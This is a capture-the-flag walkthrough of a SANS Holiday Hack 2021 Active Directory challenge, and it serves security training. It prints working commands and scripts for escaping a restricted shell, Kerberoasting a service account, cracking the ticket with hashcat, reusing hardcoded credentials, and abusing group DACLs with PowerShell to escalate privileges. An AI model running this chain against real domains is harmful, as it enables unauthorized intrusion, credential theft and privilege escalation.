---
layout: post
title:  "Kerberoasting on an Open Fire"
date:   2021-12-30 01:34:39 -0800
categories: kringlecon2021 objective8
---
This is challenge number 8 in the 2021 SANS Holiday Hack Challenge (https://2021.kringlecon.com/). Objective:

>Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer >to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.

The first step is to visit the ElfU Student Portal and register an account (https://register.elfu.org/register) in order to obtain credentials to login to the terminal.

![ElfU Registration](/assets/kringlecon2021/objective8/objective8_register.jpg)



![ElfU Registration](/assets/kringlecon2021/objective8/objective8_credentials.jpg)


Once you have obtained your credentials, then you can SSH into the box as directed by the portal

{% highlight shell %}
ssh czifpiaseh@grades.elfu.org -p 2222
{% endhighlight %}

This logs you into the grading app where you have very limited functionality. You can either choose 1 to "Print Current Courses/Grades." or "e" to exit. Therefore, the first challenge is to break out of this app and gain access to a shell. I first tried to send a Ctrl+C send a SIGINT to terminate app, but to no avail. Because this app was reading input from the terminal, I tried a Ctrl+D next to signal an EOF. This was the magic command

![ElfU Breakout](/assets/kringlecon2021/objective8/objective8_breakout.jpg)

The next observation that you can make is that this is a Python program due to the Traceback code snippet

{% highlight python %}
 a = input(": ").lower().strip()
{% endhighlight %}

We also can observe that it takes us to a prompt to enter in more Python commands. The first thing we want to try to do is execute system commands using the Python "os" module. Executing a /bin/bash command drops us to a shell

![ElfU Shell](/assets/kringlecon2021/objective8/objective8_shell.jpg)

Since we are Kerberoasting on this challenge, we want to start searching for Domain Controllers. To do this, it is helpful for us to see what networks we can see. You can discover this by issuing the route command

{% highlight shell %}
czifpiaseh@grades:/bin$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
10.128.1.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
10.128.2.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
10.128.3.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
{% endhighlight %}

Given this is a hacking challenge, nmap was already conveniently installed for us. I performed an nmap scan over the first 256 IP addresses in the 10.128.1.0,10.128.2.0,10.128.3.0, and 172.17.0.0 subnets. I chose to use port 445, and leveraged nmap's -PS host discovery option since I was running as an unprivileged user. This ended up discovering 3 domain controllers: 10.128.1.53,10.128.3.30 and 172.17.0.5

{% highlight shell %}
czifpiaseh@grades:/bin$ which nmap
/usr/bin/nmap
{% endhighlight %}

{% highlight shell %}
czifpiaseh@grades:/bin$ nmap -PS445 10.128.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-30 11:19 UTC
...
Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
Host is up (0.00049s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (2 hosts up) scanned in 6.06 seconds
...
{% endhighlight %}

{% highlight shell %}
czifpiaseh@grades:/bin$ nmap -PS445 10.128.3.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-30 11:20 UTC

...
Nmap scan report for 10.128.3.30
Host is up (0.00072s latency).
Not shown: 966 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
1024/tcp open  kdm
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1029/tcp open  ms-lsa
1030/tcp open  iad1
1031/tcp open  iad2
1032/tcp open  iad3
1033/tcp open  netinfo
1034/tcp open  zincite-a
1035/tcp open  multidropper
1036/tcp open  nsstp
1037/tcp open  ams
1038/tcp open  mtqp
1039/tcp open  sbl
1040/tcp open  netsaint
1041/tcp open  danf-ak2
1042/tcp open  afrog
1043/tcp open  boinc
1044/tcp open  dcutility
2222/tcp open  EtherNetIP-1
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
...
Nmap done: 256 IP addresses (36 hosts up) scanned in 6.05 seconds
{% endhighlight %}


{% highlight shell %}
czifpiaseh@grades:/bin$ nmap -PS445 172.17.0.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-30 11:21 UTC
...
Nmap scan report for 172.17.0.5
Host is up (0.00060s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE
42/tcp   open  nameserver
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
1024/tcp open  kdm
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
...

Nmap done: 256 IP addresses (5 hosts up) scanned in 2.05 seconds
{% endhighlight %}

Now that we have found the domain controllers, we want to connect to them and see if we can query any interesting details. The grades host had the rpcclient installed which I used for this task. From here, I was able to find interesting Domain groups, users, and shares on the network.

{% highlight shell %}
czifpiaseh@grades:/bin$ rpcclient 10.128.3.30
Enter WORKGROUP\czifpiaseh's password:
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44f]
group:[RemoteManagementDomainUsers] rid:[0x453]
group:[ResearchDepartment] rid:[0x454]
group:[File Shares] rid:[0x5e7]
rpcclient $> netshareenumall
netname: netlogon
	remark:
	path:	C:\var\lib\samba\sysvol\elfu.local\scripts
	password:
netname: sysvol
	remark:
	path:	C:\var\lib\samba\sysvol
	password:
netname: elfu_svc_shr
	remark:	elfu_svc_shr
	path:	C:\elfu_svc_shr
	password:
netname: research_dep
	remark:	research_dep
	path:	C:\research_dep
	password:
netname: IPC$
	remark:	IPC Service (Samba 4.3.11-Ubuntu)
	path:	C:\tmp
	password:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[admin] rid:[0x3e8]
user:[elfu_admin] rid:[0x450]
user:[elfu_svc] rid:[0x451]
user:[remote_elf] rid:[0x452]
...
{% endhighlight %}

Especially interesting from this output is the user "elfu_svc". This appears to be a service user which we can target in our Kerberoasting attack. I learned about a tool called impacket (https://github.com/SecureAuthCorp/impacket) which automates the process of finding a service account and retrieving the ticket granting service (TGS) ticket from the domain controller (it was preinstalled for the challenge). The tool conveniently returns a format which can be fed into hashcat for offline cracking.

Impacket comes with a script called GetUserSPNs.py which retrieves Service Principal Names that are associated with normal user accounts (https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_24/examples/GetUserSPNs.py). Running this tool gives us the hashcat compatible TGS

{% highlight shell %}
czifpiaseh@grades:~$ python3 /usr/local/bin/GetUserSPNs.py elfu.local/czifpiaseh:<redacted> -outputfile ~/elfu_svc_tgs.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 11:39:45.960562             
ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 11:39:45.960562             
ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 11:39:45.960562             
ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 11:39:45.960562             



czifpiaseh@grades:~$ ls
elfu_svc_tgs.txt
czifpiaseh@grades:~$ cat elfu_svc_tgs.txt
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$9251089afb1033ba28b4c21b7ad72177$6d267ae086bb39acfee388965d2006eefc760557649085e7dc4f24f7214e4d1e4a084f1d7895d33e40c6dfb465862fc09dbf9be7760a637fde5b11df4108f785d65c524259c0ca6b78cbcb1f5e85cc7518f1b63af3bd8769a87c7d9a82e314af9052c46bc6c93df3cd24222b80845e841db3401146f7ec4b35006eca19ee3220f616b9ab01898cb04799d4873f35f1c5469461fdea9ad1ad1bcbb167f27af06b6980026f2d273f6ceb94752ce9ad13ae28537a71e219707701ff19616e7b0a75ee105b055e99d8d9cf6941074ca18fad0cf1871966d2f9085a1264483b2a39f4d7d08708d81090b999c37e12d7f0710ffd8b6b84c7ff5695d6966e5b9cb9c09f993486580e0498be1f63d28d10789343722c601ed26429f947a6c17548c6afa51ed885036977477d40df89ece87feadfb94434371cafaa1c59070c783721697bfc0f68d5be65ff33dddf3f9c61f7c39e69b9083854dbaa8d65c74936a915afaac9fb117a1833d2fd226de1f9d53398a614eb70bb938451b37ada6b564fc3a9cc3363c1992a7c87a7dc74807322564a752a19a10ed2d3f4ea01e2a85cf4734fcab0999bba5b52f3a4e52294671f82f6619127f30e20e4e12d0bde4110dc067ee2418c6841842baca5f9bb4eacf26fa1a68e24f4064bd5bc520195d13307e2cc912c5d7e793e9fffb321a4c6073aec2e28f7471481d4219db4dd9a3e6b426d75273775c5af656cd8b9f655665ac9b7b47e8c7faf811ef91832f709363495f3fa71cc32ff74de35e858918bc398bd606333f0afa3c9a207b6acc4e07804b213487d8d864fc611c5e03fdf00da900b6b799da112b40014d488b7b1a0cb171c319338e99dc1eb7ce172b46997e1ec2b57ad5086ee9778e2740d3ebfe51a06d606340cf5a039de6d9e32e86e11a1b3463f8517ee66b0a48c58c2b748d970220e2a2457e19ea29db152e5c2c5dd28f168d4b0dd2a390e327e541daa3098f3b2328ff3bcafee639c8057a6d5bb9090d0be75b92ccd0417e208bfca43132303764536c3b81ece1d24638b353bb3a2aff71d451ae0300ff55e808da483629afbec862feb77a958da10cc6a0dadf38824978d931278579be872ecf1e2b9f99d726501ba4606ece34497c3f1adde1c0aa6e33edecda0f3689c2071e25000adda29a759b0fa6e34e60b169b1c808a223e5519e66e871cd5b08bc3a887ac91009a2b07e04e1b7e4c6fd15e73e117976af2a6a4db615b3d66455861700c0289ea90e67b5eac60e95525f4dd720362b23fb1366b98201b957fd7226744b4d2a630b51024454f69a1d336fead471571aec114c12e4b841ce95252f5d153cc73bc6f5e543d55eb061a35001c3dd4d6b4c2fd63fbfddc30ff19cf47700ccdeb53f9d8064ac71b55d59bb78777daa8f36f6c6a6eb00e35d820782617353ac9f1d3b33bc2146baad879a0d321d67eb0
{% endhighlight %}

OK, so we've got a TGS for the elfu_svc. Now we need to generate a wordlist for attempting to crack the password. We learn from "Eve Snowshoes" that we should check out CeWL (https://github.com/digininja/CeWL) for generating a wordlist, and that we can enhance the wordlist using a rule called OneRuleToRuleThemAll.rule (https://github.com/NotSoSecure/password_cracking_rules). CeWL works by pointing to a website that is in close relation to the password you are trying to crack. In this case, that would be the ElfU student portal (https://register.elfu.org/register)

{% highlight shell %}
88665a561824:CeWL bryan$ ./cewl.rb --with-numbers -w passwords.txt https://register.elfu.org/register -d 3
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

88665a561824:CeWL bryan$ cat passwords.txt
the
domain
and
students
must
this
ElfU
Student
account
Name
Registration
All
Elf
rocks4socks
cookiepella
asnow2021
...
{% endhighlight %}

We now have a TGS and wordlist. The next step is to let hashcat attempt to crack the ticket.

{% highlight shell %}
88665a561824:kringle_con bryan$ hashcat -m 13100 elfu_svc_tgs.crack passwords.txt -r OneRuleToRuleThemAll.rule
hashcat (v6.2.5-70-g6975cc090) starting

OpenCL API (OpenCL 1.2 (Sep 5 2021 22:39:07)) - Platform #1 [Apple]

* Device #1: Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 8160/16384 MB (2048 MB allocatable), 12MCU
* Device #2: Intel(R) UHD Graphics 630, skipped
* Device #3: AMD Radeon Pro 5300M Compute Engine, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Skipping invalid or unsupported rule in file OneRuleToRuleThemAll.rule on line 8210: ^o^ą^Ă^o^t
Skipping invalid or unsupported rule in file OneRuleToRuleThemAll.rule on line 42459: ^a^ą^Ă^e^s^a^r^t^n^o^c
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 51995

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 77
* Bytes.....: 524
* Keyspace..: 4003615

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$f0baef6a9ed4ae9517634a585a8faeeb$07f92a1423b61c1f2ba206e67c9294d786dc618a7e04684779dadc3cfcf131807f39212d4d565524071e4ad0b2c5058eba0edabf56e766a8ab3bc74c8b42d3c5f9f2ba4d2273a4235e2cb96e2eaa2d659ed3253191cb36eec79e676896d8b5580ae727db7e5efd2a9052e9ba9560ec66120be64c9ad7921591bcd9e005f0ffacbb6273fe248ec83d2af450ef89eeb83e8d4fdaa4678c2ba5f197cea68dd0c635fde64956087b49c1b0136c918bb418d015618b931f720cc0f72c391280224bdff94d220f72ba2a74fb3a165aa4d321d132a6609fca982648fe13292dd6ccc6ab0e0697be27fd314e7538848a24752c28c03a33a32507f81acd4fd290d83a2a63a17718eb8d4c33d1ce7d32bdae0c88a8ed398a3b5202ef5e6eafca89ded370ae67a2d66126ebdf30b87210d31bbda81b417e9fcd16f1d4d4d59b83352eb392d4724348d7702452d61e4e47062acb83a7c1307dbf637b73149c39c9886ba875847f46dd1ab0ec146032c539b39655ae113032638bb22c8ca6cc1cda48e4754491747db258eb6d45e2390d2f393ea552a4051a7667bb7de98f128e24b5cf862972682045b3ab431aa6c723fe1dce3e9390586290379764f070643fe5764ebf41309b50e9113da11cfb194f17f09b9e17b4b267be1b9bea561a9b1d51f36fc64bb38fdad0cd1b1d8c94a34b6aea5acda8c4d6e38372f78b25121fe02701602d7c37752b84d3f7f822423aedb8515a87103771ace364d58dd46f03421dfeb2fc548c700de1eba4e2a53c2cd54a559f2f2963f87243459debd9d307d247e3e07cb4071b3633dee28a895c3286765d90b22722ab96826ed0155808936d89d93a2c9bbb33936695e36d0af06682d9e6ef3443efaa1c2d1fc0e2cb576a1ac5e2f297f9bddfa9118cd03a2eac99701133850f5320cc7a86082cc6599433c8ca5654b8b7a34497d781a3f57cacfd68293bb76728ac8d2b479fad5b07ff1421e05682c492be1c3e3bd72f2a75ac04e13c5adb1f9dc28400c8fe921d7ff2fcbdaf5e6691e98cdd8da3052728b55673cffd41aef2582da8647b5aada5e21c54aaee10c51464c1a77e3376fbb8fc5dfe8235bd3668a2d42b2631011944d7e6fc8ea617f9308d830904438a0b279b8bddacebeb636b1acfdbdf42f2b32de18bde018e7cd4cd171c1bd471b5e1549af57e4cac586ff30b95c5207b2a2925d98963ddcaa5b0654f919fba1f0358541fc0378f82d44d19e69c6a6611f93f409638408b30ca6c58be07abac3c37a0b4748510fa7dfaf841689e547feb21515653f6b7e720e15db08a9118db843df1ffbb2abe939224109b01ea0533ac59a57adda52a946cfc472f5588a95d01bc6baacb93c7269c7b8a97a498c924b8c4dd369980aaf7184bced85164b378ee0f347cbac829cbab9fe3021e6dc1a303fb39c2b58bcb3d287bfb10b9a552e57a9984:Snow2021!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...7a9984
Time.Started.....: Wed Dec 29 21:52:39 2021 (1 sec)
Time.Estimated...: Wed Dec 29 21:52:40 2021 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Mod........: Rules (OneRuleToRuleThemAll.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 4717.0 kH/s (4.08ms) @ Accel:16 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3134208/4003615 (78.28%)
Rejected.........: 0/3134208 (0.00%)
Restore.Point....: 0/77 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:40448-40704 (tel:4044840704) Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#1....: The0307 → cnternal
Hardware.Mon.SMC.: Fan0: 48%, Fan1: 48%
Hardware.Mon.#1..: Temp: 72c

Started: Wed Dec 29 21:52:35 2021
Stopped: Wed Dec 29 21:52:40 2021
{% endhighlight %}

Woo-hoo! So, we now have discovered the password for elfu_svc is Snow2021!. Now we recall that there was a share called "elfu_svc_shr". We can try to connect to this share to discover any interesting information. To do this, I used the smbclient tool. This took several tries and only worked against a certain domain controller.

{% highlight shell %}
czifpiaseh@grades:~$ smbclient \\\\10.128.1.53\\elfu_svc_shr -U=elfu_svc%Snow2021!
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
czifpiaseh@grades:~$ smbclient \\\\172.17.0.5\\elfu_svc_shr -U=elfu_svc%Snow2021!
Try "help" to get a list of possible commands.
smb: \>
{% endhighlight %}

Inspecting the directory turned up a ton of different administrative powershell scripts. I downloaded these locally to the grades machine so that I could inspect them more easily.

{% highlight shell %}
smb: \> ls
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Thu Dec 30 08:01:24 2021
  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021
  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021
  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021
  create-knownissue-function.ps1      N     2104  Wed Oct 27 19:12:43 2021
  PsTestFunctions.ps1                 N    52454  Wed Oct 27 19:12:43 2021
  StoreIngestionApplicationApi.ps1      N   108517  Wed Oct 27 19:12:43 2021
  Compile-ObjectsInNavContainer.ps1      N     4431  Wed Oct 27 19:12:43 2021
  Run-ConnectionTestToNavContainer.ps1      N    13856  Wed Oct 27 19:12:43 2021
  StoreIngestionIapApi.ps1            N    80725  Wed Oct 27 19:12:43 2021
  Test-SdnKnownIssue.ps1              N     4384  Wed Oct 27 19:12:43 2021
  Setup-TraefikContainerForNavContainers.ps1      N     9184  Wed Oct 27 19:12:43 2021
  Get-NavContainerPlatformVersion.ps1      N     1640  Wed Oct 27 19:12:43 2021

smb: \> prompt OFF
smb: \> mget *
getting file \Get-NavArtifactUrl.ps1 of size 2018 as Get-NavArtifactUrl.ps1 (1970.5 KiloBytes/sec) (average 1970.7 KiloBytes/sec)
getting file \Get-WorkingDirectory.ps1 of size 188 as Get-WorkingDirectory.ps1 (183.6 KiloBytes/sec) (average 1077.1 KiloBytes/sec)
getting file \Stop-EtwTraceCapture.ps1 of size 924 as Stop-EtwTraceCapture.ps1 (902.3 KiloBytes/sec) (average 1018.9 KiloBytes/sec)
getting file \create-knownissue-function.ps1 of size 2104 as create-knownissue-function.ps1 (2054.5 KiloBytes/sec) (average 1277.8 KiloBytes/sec)
getting file \PsTestFunctions.ps1 of size 52454 as PsTestFunctions.ps1 (51219.6 KiloBytes/sec) (average 11267.2 KiloBytes/sec)
...
{% endhighlight %}

I used grep to search for various terms. But ended up finding useful information when I searched for "elfu". The GetProcessInfo.ps1 powershell file contained a reference to remote_elf which we observed as a domain user in the earlier step.

{% highlight shell %}
czifpiaseh@grades:~$ grep -r "elfu"
GetProcessInfo.ps1:$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
{% endhighlight %}

Upon further inspection, we find that there is a hardcoded password in this file. And that this file was being used to Invoke a command remotely on one of the domain controllers we discovered earlier (10.128.1.53).

{% highlight powershell %}
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
{% endhighlight %}

We can use this information now to obtain a remote powershell session on that domain controller. First we drop into a powershell terminal

{% highlight shell %}
czifpiaseh@grades:~$ powershell
PowerShell 7.2.0-rc.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /home/czifpiaseh>
{% endhighlight %}

Then we run our modified code to call the Enter-PSSession cmdlet.

{% highlight powershell %}
$password = ConvertTo-SecureString "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA" -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $password)
Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
{% endhighlight %}

And land a session on the domain controller!

{% highlight shell %}
[10.128.1.53]: PS C:\Users\remote_elf\Documents>
{% endhighlight %}


From here, we get to leverage what we learned from Chris Davis's awesome presentation (https://www.youtube.com/watch?v=iMh8FTzepU4). He instructs us on how you can use Powershell to give a user the "GenericAll" permission on a Active Directory group object. And once that has been accomplished, then the user can add itself to the active directory group in question. We learned from earlier there was a group called ResearchDepartment and a share called research_dep. Because of this, a logical choice would be to add ourselves to the ResearchDepartment group and try to access the share.

{% highlight powershell %}
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "czifpiaseh"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
{% endhighlight %}

After executing this command, you can check that the permission was added by checking the group DACL

{% highlight powershell %}
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
{% endhighlight %}

![ElfU DACL](/assets/kringlecon2021/objective8/objective8_group_dacl.jpg)

Now that we've done that, we can escalate our privileges by adding ourselves to the group

{% highlight powershell %}
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "czifpiaseh"
$password = "<redacted>"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
{% endhighlight %}

Now lets try connecting to that share!

{% highlight shell %}
PS /home/czifpiaseh> smbclient \\10.128.3.30\research_dep -U=czifpiaseh%<redacted>
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Thu Dec 30 08:01:24 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

		41089256 blocks of size 1024. 34855768 blocks available
smb: \>
{% endhighlight %}

This looks like our answer! The last step was to figure out how to download the document. First, you have to get it over to the grades host.

{% highlight shell %}
smb: \> mget *
Get file SantaSecretToAWonderfulHolidaySeason.pdf? y
getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf (56616.6 KiloBytes/sec) (average 56618.5 KiloBytes/sec)
smb: \>
{% endhighlight %}

From there, you could use scp to download it to a local machine to take a look at the PDF. But there was a catch. The shell for the user was set to point to the grades application. This caused an error that prevented scp from downloading the file

{% highlight shell %}
88665a561824:~ bryan$ scp -P 2222 czifpiaseh@grades.elfu.org:/home/czifpiaseh/SantaSecretToAWonderfulHolidaySeason.pdf .
czifpiaseh@grades.elfu.org's password:
TERM environment variable not set.
\033[36m===================================================\033[0m
88665a561824:~ bryan$ TERM environment variable not set.
{% endhighlight %}

To fix this, I reset the shell on the grades host for my user

{% highlight shell %}
PS /home/czifpiaseh> chsh -s /bin/bash czifpiaseh
Password:
PS /home/czifpiaseh>
{% endhighlight %}

Then I was able to download

{% highlight shell %}
88665a561824:~ bryan$ scp -P 2222 czifpiaseh@grades.elfu.org:/home/czifpiaseh/SantaSecretToAWonderfulHolidaySeason.pdf .
czifpiaseh@grades.elfu.org's password:
SantaSecretToAWonderfulHolidaySeason.pdf                                     100%  170KB 670.7KB/s   00:00
{% endhighlight %}


![ElfU Secret](/assets/kringlecon2021/objective8/objective8_santasecret.jpg)

And we can see from reading the document, that Santa's first ingredient he urges each elf and reindeer to consider is Kindness!


![ElfU Complete](/assets/kringlecon2021/objective8/objective8_complete.jpg)
